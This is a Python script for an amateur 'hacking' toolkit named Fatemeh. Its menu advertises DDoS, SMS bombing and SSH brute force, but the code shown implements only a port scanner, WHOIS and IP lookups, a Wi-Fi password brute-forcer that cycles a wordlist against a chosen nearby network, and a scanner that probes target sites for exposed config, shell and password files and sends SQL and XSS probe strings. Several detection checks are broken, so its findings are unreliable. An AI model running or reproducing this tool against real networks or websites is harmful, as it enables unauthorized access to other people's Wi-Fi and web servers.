# ==========================IMPORTING============================
import os, sys, time, base64, shutil, socket
try:
    from rich.console import Console
    import requests
except:
    os.system("pip install rich")
    os.system("pip install requests")
    try:
        from rich.console import Console
        import requests
    except:
        input("""


       CanT Importing Librarys :(

    Pleaze Instaling Lib


 Enter For Close

""")
    sys.exit()
# ==========================IMPORTING============================



# =================================STARTING...=====================
console = Console()
if os.name == 'nt':
    os.system('color F')
def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def slash_system():
    if os.name == 'nt':
        ccvf = "\ "
        return ccvf[:-1]
    else:
        return "/"
# =================================STARTING...=====================


# ===================================LOGIN==================================
path = os.getcwd()
clear_screen()
def fin1(date_kko):
    Username = date_kko.split("[//Fateme///]>>")[0]
    Password = date_kko.split("[//Fateme///]>>")[1]
    print("""
    
 WELCOM  To  Fatemeh    """+str(Username)+"""
 

 """)
    while True:
        password_user_Enter = str(input(" Enter Password: "))
        if password_user_Enter == Password:
            console.print("\n\n\n\n\n\n   WELCOM TO YOUR Fatemeh!\n\n\n",  style="bold green")
            time.sleep(1.5)
            break
        else:
            console.print("   [!] Password Is NotGood!", style="bold red")
            time.sleep(2)
def fin2():
    while True:
        print("""
    
 WELCOM  To  Fatemeh
 

Your Not Have Accont. Try Make New Accont !


 """)
        Username = str(input(" Enter Username Accont: "))
        Password = str(input(" Enter Password Accont: "))
        llk = (Username+"[//Fateme///]>>"+Password).encode()
        kko.write(base64.b64encode(llk).decode())
        console.print("\n\n\n\n Maked!!\n\n", style="bold green")
        break
try:
    kko = open(path+slash_system()+"Config"+slash_system()+"CONFIG_MAIN_BIG_DATA.txt", "r")
    passworvetfvtetdeycbeucuyeuhucuehu = (123456789087654321233)
except:
    try:
        os.mkdir(path+slash_system()+"Config")
    except:
        pass
    passworvetfvtetdeycbeucuyeuhucuehu = (1234567891)
if passworvetfvtetdeycbeucuyeuhucuehu == 123456789087654321233:
    for xxc in kko:
        xe = xxc.encode()
        xt = base64.b64decode(xe).decode()
        fin1(xt)
        break
else:
    kko = open(path+slash_system()+"Config"+slash_system()+"CONFIG_MAIN_BIG_DATA.txt", "w+")
    fin2()
try:
    kko.close()
except:
    pass
clear_screen()
# ===================================DARKUP LOGIN==================================



# ===================================Baner================================
def Bnr():
    clear_screen()
    print("""


 ______    _                       _    _            _    _             
|  ____|  | |                     | |  | |          | |  (_)            
| |__ __ _| |_ ___ _ __ ___   ___ | |__| | __ _  ___| | ___ _ __   __ _ 
|  __/ _` | __/ _ \ '_ ` _ \ / _ \|  __  |/ _` |/ __| |/ / | '_ \ / _` |
| | | (_| | ||  __/ | | | | |  __/| |  | | (_| | (__|   <| | | | | (_| |
|_|  \__,_|\__\___|_| |_| |_|\___||_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |
                                                                    __/ |
                                                                   |___/ 
""")
    console.print("""


   Codet By : Fatemeh :)
   Version  : 1.8

    1 ) . . . Port Scaner //
    2 ) . . . SmS Bomber Attack
    3 ) . . . Get Info Web //
    4 ) . . . DdoS Attack To servers
    5 ) . . . Wi-Fi Hacker //
    6 ) . . . Security Scan WebSite //
    7 ) . . . Get Ip WebSite //
    9 ) . . . Hack Zip File  (Crack)
    10) . . . Encryption or Decoding A File
    12) . . . Baner Maker
    13) . . . SSH-BruteForce
    14) . . . Hide your information behind the photo
    15) . . . Mr.Qrcode
    16) . . . Info Php Exploit



 01) . . . Help Script For You :)
 02) . . . Remove It Acoont
 0 ) . . . Exit

""", style="bold green")
# ===================================Baner================================





# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#                        IT                                  +
#                       TOOL                                 +
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
def scan_port():
    clear_screen()
    print("\n\n\n\n\t O P E N   S C A N E R\n\n\n")
    ip = str(input(" [ Enter Ip Target ] $_ "))
    clear_screen()
    print("\n     Enter Range Scan  \n\n")
    ranw = str(input(" [ Of ] $_ "))
    until = str(input(" [ until ] $_ "))
    try:
        socket.gethostbyname("google.com")

        ssy = str(input("\n\n Do You Like Run Fast Scan(n/y): "))
        if ssy == 'y' or ssy == 'Y' or ssy == "yes":
            test_s = 0.5
        else:
            test_s = 1
        clear_screen()
        rang = int(ranw)
        rang_untile = int(until)
        print('''
        
 _____     ____    _____    _______  
|  __ \   / __ \  |  __ \  |__   __|
| |__) | | |  | | | |__) |    | |   
|  ___/  | |  | | |  _  /     | |   
| |      | |__| | | | \ \     | |   
|_|       \____/  |_|  \_\    |_|   
                                                                           
                                                                           
     _____    _____              _   _    ______   _____  
    / ____|  / ____|     /\     | \ | | |  ____| |  __ \ 
   | (___   | |         /  \    |  \| | | |__    | |__) |
    \___ \  | |        / /\ \   | . ` | |  __|   |  _  / 
    ____) | | |____   / ____ \  | |\  | | |____  | | \ \ 
   |_____/   \_____| /_/    \_\ |_| \_| |______| |_|  \_\ 
                 
                 
''')
        console.print("\n\nIP  IS: " + ip, style="bold yellow")
        if ssy == 'y' or ssy == 'Y' or ssy == "yes":
            test_s = 0.5
            console.print("\nFAST SCANER: On", style="bold green")
        else:
            test_s = 1
            console.print("\nFAST SCANER: Off", style="bold yellow")
        print("\n\n\n\n")
        list_open = []
        for port in range(rang , rang_untile):
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(test_s)
            try:
                save = sock.connect_ex((ip, port))
                if save == 0:
                    console.print("\n\t port {}: open\n\n".format(port), style="bold green")
                    list_open.append(port)
                if save != 0:
                    console.print("\t port {}: close\n".format(port), style="bold red")   
            except:
                print("\t port {}: error".format(port))
            sock.close()
        if list_open != 0:
            print("\n\n\n\n\n\n\n")
            console.print("\t\t O P E N   P O R T S", style="bold red")
            for ss in list_open:
                console.print("\n\t port {}: open\n\n".format(ss), style="bold green")
        input("\n\n\n\n\t  Enter for close ")
        clear_screen()
        Bnr()
    except:
            print("  . . . . .  Your Not Connect To Net! . . . . . .\n")
            time.sleep(2.5)
            input("\n\n\n\n\t  Enter for close ")
            clear_screen()
            Bnr()
# ================================================================================
def whois():
    clear_screen()
    try:
        socket.gethostbyname("google.com")
        print('''
__          ___    _ _____ ____   _____ 
\ \        / / |  | |_   _/ __ \ / ____|
 \ \  /\  / /| |__| | | || |  | | (___  
  \ \/  \/ / |  __  | | || |  | |\___ \ 
   \  /\  /  | |  | |_| || |__| |____) |
    \/  \/   |_|  |_|_____\____/|_____/ 
                                        
                                        
       _____  _____ _____  _____ _____ _______ 
      / ____|/ ____|  __ \|_   _|  __ \__   __|
     | (___ | |    | |__) | | | | |__) | | |   
      \___ \| |    |  _  /  | | |  ___/  | |   
      ____) | |____| | \ \ _| |_| |      | |   
     |_____/ \_____|_|  \_\_____|_|      |_|   
                                          
                                          
''')
        domain = input("Domain : ").lower()
        clear_screen()
        domain = domain.replace("http://","")
        domain = domain.replace("https://","")
        domain = domain.replace("www.","")
        if domain[-3:] == "org" or domain[-3:] == "com" or domain[-3:] == "net":
            whois_server = "whois.internic.net"
        else:
            whois_server =  "whois.iana.org"
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        s.connect((whois_server,43))
        s.send((domain+"\r\n").encode())
        msg = s.recv(10000)
        print(msg.decode())
        input("\n\n\n\n\t  Enter for close ")
        clear_screen()
        Bnr()
    except:
        print("  . . . . .  Your Not Connect To Net! . . . . . .\n")
        time.sleep(2.5)
        input("\n\n\n\n\t  Enter for close ")
        clear_screen()
        Bnr()
# ================================================
def wifih():
    from pywifi import const, PyWiFi,Profile
    clear_screen()
    print("""
                             ,1             ,-=============.
                            /,| ___________((____________\ \_                _
        ,========.________//_|/===========._#############L_Y_....-----====//
[1;3Wi-Fi_HACKER\ 033[0m 033[36m(#######(==========\################\=======.______ --############((
        `=======`"        ` ===============|::::.___|[ ))[JW]#############\ \ \
                                           |####|     ""\###|   :##########\ \ \
                                                /####/         \##\     ```'''=,,,))
                                               /####/           \##\ 
                                              '===='             '=='

""")
    def scan():
        interface.scan()
        time.sleep(8)
        result = interface.scan_results()
        return result
    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        time.sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
    wifi = PyWiFi()
    interface = wifi.interfaces()[0]
    passlist = input("  [ Enter password list ] $_ ")
    print("Scanning ... \n\n")
    APs = scan()
    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))
    index = int(input("\n>> "))
    target = APs[index-1]
    for password in open(passlist):
        password = password.strip("\n")
        print("Testing : {}".format(password))
        if testwifi(target.ssid , password) : # Test for connection using password
            print("-" *30)
            print("PASSWORD : {}".format(password))
            print("-" *30)
            break
    input("\n\n\n\n\t  Enter for close ")
    clear_screen()
    Bnr()
# ============================================================
def Security_Error():
    clear_screen()
    try:
        socket.gethostbyname("google.com")

        def bnrf():
            print('''
  _____                      _ _           ____              
 / ____|                    (_) |         |  _ \             
| (___   ___  ___ _   _ _ __ _| |_ _   _  | |_) |_   _  __ _ 
 \___ \ / _ \/ __| | | | '__| | __| | | | |  _ <| | | |/ _` |
 ____) |  __/ (__| |_| | |  | | |_| |_| | | |_) | |_| | (_| |
|_____/ \___|\___|\__,_|_|  |_|\__|\__, | |____/ \__,_|\__, |
                                    __/ |               __/ |
                                   |___/               |___/ 
 ______ _           _           
|  ____(_)         | |          
| |__   _ _ __   __| | ___ _ __ 
|  __| | | '_ \ / _` |/ _ \ '__|
| |    | | | | | (_| |  __/ |   
|_|    |_|_| |_|\__,_|\___|_|   
                                
                                
                              
                                
  ''')
        bnrf()

        Target = input("\n\n\n Enter Site Target: ")
        if not "http://" in Target and not "https://" in Target:
            Target = ("http://"+Target)
    
        clear_screen()
        bnrf()
        print("\n\n\n Your Target Is: "+str(Target)+"\n\n\n")


        Tar = (Target+"/wp-config.php")
        res = requests.get(Tar)
        wpconfig = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show wp-config.php file ))", style="bold green")
            wpconfig = 1
        else:
            console.print("\n [-] NotFind Bug! (( show wp-config.php file ))", style="bold red")
        Tar = (Target+"/wp-admin")
        res = requests.get(Tar)
        wpadmin = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show wp-admin ))", style="bold green")
            wpadmin = 1
        else:
            console.print("\n [-] NotFind Bug! (( show wp_admin ))", style="bold red")
        Tar = (Target+"/info.php")
        res = requests.get(Tar)
        infobug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show info.php file ))", style="bold green")
            infobug = 1
        else:
            console.print("\n [-] NotFind Bug! (( show info.php file ))", style="bold red")
        Tar = (Target+"/shell.php")
        res = requests.get(Tar)
        hellbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! ((  show shell ))", style="bold green")
            hellbug = 1
        else:
            console.print("\n [-] NotFind Bug! (( show shell ))", style="bold red")
        Tar = (Target+"/cpanel")
        res = requests.get(Tar)
        cpanelbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! ((  show cpanel ))", style="bold green")
            cpanelbug = 0
        else:
            console.print("\n [-] NotFind Bug! (( show cpanel ))", style="bold red")
        Tar = (Target+"/main.php")
        res = requests.get(Tar)
        mainbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show main file ))", style="bold green")
            mainbug = 1
        else:
            console.print("\n [-] NotFind Bug! (( show main file ))", style="bold red")
        Tar = (Target+"/login.php")
        res = requests.get(Tar)
        loginbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show login file ))", style="bold green")
            loginbug = 0
        else:
            console.print("\n [-] NotFind Bug! (( show login file ))", style="bold red")
        Tar = (Target+"/ip.php")
        res = requests.get(Tar)
        ipbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show ip file ))", style="bold green")
            ipbug = 0
        else:
            console.print("\n [-] NotFind Bug! (( show ip file ))", style="bold red")
        Tar = (Target+"/pass.php")
        res = requests.get(Tar)
        passbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show pass file ))", style="bold green")
            passbug = 0
        else:
            console.print("\n [-] NotFind Bug! (( show pass file ))", style="bold red")
        Tar = (Target+"/password.php")
        res = requests.get(Tar)
        passwrdbugg = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show password file ))", style="bold green")
            passwrdbugg = 1
        else:
            console.print("\n [-] NotFind Bug! (( show password file ))", style="bold red")
        Tar = (Target+'''/"''')
        res = requests.get(Tar)
        sqlbug = 0
        content = res.content
        content = content.decode()
        if "sql" in content or "Sql" in content:
            console.print("\n  [+] New Bug! (( SQL ))", style="bold green")
            sqlbug = 0
        else:
            console.print("\n [-] NotFind Bug! (( SQL ))", style="bold red")
        Tar = (Target+"""/'""")
        res = requests.get(Tar)
        sqlbug2 = 0
        content = res.content
        content = content.decode()
        if "sql" in content or "Sql" in content:
            console.print("\n  [+] New Bug! (( SQL ))", style="bold green")
            sqlbug2 = 1
        else:
            console.print("\n [-] NotFind Bug! (( SQL )) ", style="bold red")
        Tar = (Target+"/wordpres.php")
        res = requests.get(Tar)
        werdpreesbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show wp file ))", style="bold green")
            werdpreesbug = 1
        else:
            console.print("\n [-] NotFind Bug! (( show wp file ))", style="bold red")
        Tar = (Target+"/security.php")
        res = requests.get(Tar)
        securitybug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show security file ))", style="bold green")
            securitybug = 1
        else:
            console.print("\n [-] NotFind Bug! (( show security file ))", style="bold red")
        Tar = (Target+"/htaccess.")
        res = requests.get(Tar)
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show htaccess file ))", style="bold green")
        else:
            console.print("\n [-] NotFind Bug! (( show htaccess file ))", style="bold red")
        Tar = (Target+"/mysql.php")
        res = requests.get(Tar)
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show mysql file ))", style="bold green")
        else:
            console.print("\n [-] NotFind Bug! (( show mysql file ))", style="bold red")
        Tar = (Target+"/users.php")
        res = requests.get(Tar)
        userbug = 0
        if res.status_code == 200:
            console.print("\n  [+] New Bug! (( show users file ))", style="bold green")
            userbug = 1
        else:
            console.print("\n [-] NotFind Bug! (( show users file ))", style="bold red")
        Tar = (Target+"/search?=<script>alert(111)</script>")
        xssbug = 0
        res = requests.get(Tar)
        Tar = (Target+"<script>alert(111)</script>")
        res2 = requests.get(Tar)
        if res.status_code == 200 or res2.status_code == 200:
            console.print("\n  [+] New Bug! (( Xss bug ))", style="bold green")
            xssbug = 1
        else:
            console.print("\n [-] NotFind Bug! (( Xss bug ))", style="bold red")
        input("\n\n\n  Enter For Go To Hacker Site By Security Bugs    ")
        clear_screen()
        bnrf()
        print("\n\n\n\n")
        if wpconfig == 1:
            console.print("\n\n For Connect To Bug (( show wp-config.php file )) Go To   \n"+Target+"/wp-config.php", style="bold green")
        if wpadmin == 1:
            console.print("\n\n For Connect To Bug (( show wp-admin )) Go To   \n"+Target+"/wp-admin", style="bold green")
        if infobug == 1:
            console.print("\n\n For Connect To Bug (( show info file )) Go To   \n"+"Select option 16 from Fatemeh", style="bold green")
        if cpanelbug == 1:
            console.print("\n\n For Connect To Bug (( show cpanel )) Go To   \n"+Target+"/cpanel", style="bold green")
        if mainbug == 1:
            console.print("\n\n For Connect To Bug (( show main file )) Go To   \n"+Target+"/main.php", style="bold green")
        if loginbug == 1:
            console.print("\n\n For Connect To Bug (( show login file )) Go To   \n"+Target+"/login.php", style="bold green")
        if ipbug == 1:
            console.print("\n\n For Connect To Bug (( show ip file )) Go To   \n"+Target+"/ip.php", style="bold green")
        if passbug == 1:
            console.print("\n\n For Connect To Bug (( show pass file )) Go To   \n"+Target+"/pass.php", style="bold green")
        if passwrdbugg == 1:
            console.print("\n\n For Connect To Bug (( show password file )) Go To   \n"+Target+"/login.php", style="bold green")
        if sqlbug == 1:
            console.print("\n\n Your Target Have  Sql Bug", style="bold green")
        if sqlbug == 1:
            console.print("\n\n Your Target Have  Sql+ Bug", style="bold green")
        if werdpreesbug == 1:
            console.print("\n\n For Connect To Bug (( show wp file )) Go To   \n"+Target+"/wordpres.php", style="bold green")
        if securitybug == 1:
            console.print("\n\n For Connect To Bug (( show security file )) Go To   \n"+Target+"/security.php", style="bold green")
        if userbug == 1:
            console.print("\n\n For Connect To Bug (( show users file )) Go To   \n"+Target+"/users.php", style="bold green")
        input("\n\n\n\n\t  Enter for close ")
        clear_screen()
        Bnr()
    except:
        print("  . . . . .  Your Not Connect To Net! . . . . . .\n")
        time.sleep(2.5)
        input("\n\n\n\n\t  Enter for close ")
        clear_screen()
        Bnr()
# ===============================================================
def gis(site):
    clear_screen()
    try:
        socket.gethostbyname("google.com")
        console.print("  #################################################", style="bold blue")
        console.print("  #           @$#          $#&#$                  #", style="bold red")
        console.print("  #           @$*          %&    $                #", style="bold blue")
        console.print("  #           $$%          @%   &                 #", style="bold red")
        console.print("  #           !$%          $$ $                   #", style="bold blue")
        console.print("  #           #$$          $^                     #", style="bold red")
        console.print("  #           $#$          $#                     #", style="bold blue")
        console.print("  #           $%#          &!                     #", style="bold red")
        console.print("  #################################################", style="bold blue")
        print("\n\n\n")
        mod = input("Show Ip Target By   Script  Or  Web(s/w): ")
        if mod == 's' or mod == 'S':
            try:
                ip = socket.gethostbyname(site)
                dns_server = socket.gethostbyaddr(site)
                console.print("\n  ###############################################", style="bold green")
                console.print("\n  #                                             #", style="bold green")
                console.print("\n  # your ip addres :  "+ip+"    ", style="bold green")
                console.print("\n  # doamin name :  "+site+"    ", style="bold green")
                try:
                    for ii in dns_server:
                        console.print("\n  # dns server :  "+ii+"    ", style="bold green")
                except:
                    pass
                console.print("\n\n  #                   by                        #", style="bold green")
                console.print("\n  ###############################################", style="bold green")
                input("\n\n\n\n\t  Enter for close ")
                clear_screen()
                Bnr()
            except:
                print("Error  not find site")
                time.sleep(1.5)
                clear_screen()
                Bnr()
        elif mod == 'w' or mod == 'W':
            try:
                ip = socket.gethostbyname(site)
                dns_serverwww = socket.gethostbyaddr(site)
                web = open("Show-Web.html", "w+")
                web.write('''
<!DOCTYPE html><html long="en-US"><head><titele style="color:rgb(255, 255, 255);">Show Ip Target By DarkUp</titele><meta charset="UTF-8"></head><body style="background-color:rgb(1, 0, 1);"></body>

<h1 style="color:rgb(178, 130, 209);font-family:arial;font-size:500%;text-align:center;">Your Ip Target Is</h1>

<h1 style="color:rgb(37, 207, 219);font-family:arial;font-size:400%;text-align:center;">'''+str(ip)+'''</h1>

<h1 style="color:rgb(178, 130, 209);font-family:arial;font-size:250%;text-align:center;">By DarkUp</h1>

<br><br><br><br><br>
<h1 style="color:rgb(178, 130, 209);font-family:arial;font-size:500%;text-align:center;">Your Dns Target Is</h1>

''')
                try:
                        web.write('''
<h1 style="color:rgb(37, 207, 219);font-family:arial;font-size:400%;text-align:center;">'''+str(dns_serverwww)+'''</h1>

<h1 style="color:rgb(178, 130, 209);font-family:arial;font-size:250%;text-align:center;">By DarkUp</h1>

''')
                except:
                    pass

                web.write('''
<br><br><br><br><br>
<h1 style="color:rgb(176, 243, 232);font-family:arial;font-size:100%;">Your Target Is: '''+str(site)+'''</h1>
<h1 style="color:rgb(176, 243, 232);font-family:arial;font-size:100%;">Your Ip Target Is: '''+str(ip)+'''</h1>
<h1 style="color:rgb(176, 243, 232);font-family:arial;font-size:100%;">Site Target IS: On</h1>

</body>
</html>''')
                web.close()
                os.startfile("Show-Web.html")
                clear_screen()
                Bnr()
            except:
                print("Error  not find site")
                time.sleep(1.5)
                clear_screen()
                Bnr()

        else:
            print("\n\n\n\n Your Not Enter  s  or  w   !")
            clear_screen()
            Bnr()
    except:
        print("  . . . . .  Your Not Connect To Net! . . . . . .\n")
        time.sleep(2.5)
        input("\n\n\n\n\t  Enter for close ")
        clear_screen()
        Bnr()
# ===========================================================================================






















# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#                        IT                                  +
#                       TOOL                                 +
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++








Bnr()
def main():
    while True:
        reques_use = input("\n Enter 0/20 -> -> ")
        reques_user = str(reques_use)
        codfList = ['0', '01', '02', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', 
               '13', '14', '15', '16']
        if reques_user in codfList:
            if reques_user == '0':
                clear_screen()
                sys.exit()
            elif reques_use == '02':
                path = os.getcwd()
                pathp = (path+slash_system()+"Config")
                try:
                    os.remove(pathp+slash_system()+"CONFIG_MAIN_BIG_DATA.txt")
                except:
                    try:
                        os.rmdir(pathp)
                    except:
                        try:
                            shutil.rmtree(pathp)
                        except:
                            pass
                clear_screen()
                Bnr()
            elif reques_use == '1':
                scan_port()
            elif reques_use == '3':
                whois()
            elif reques_use == '5':
                wifih()
            elif reques_use == '6':
                Security_Error()
            elif reques_user == '7':
                print('\n\n')
                clear_screen()
                si = input("\n\n\t [ Enter url target ] $_ ")
                gis(si)


        else:
            clear_screen()
            Bnr()






main()
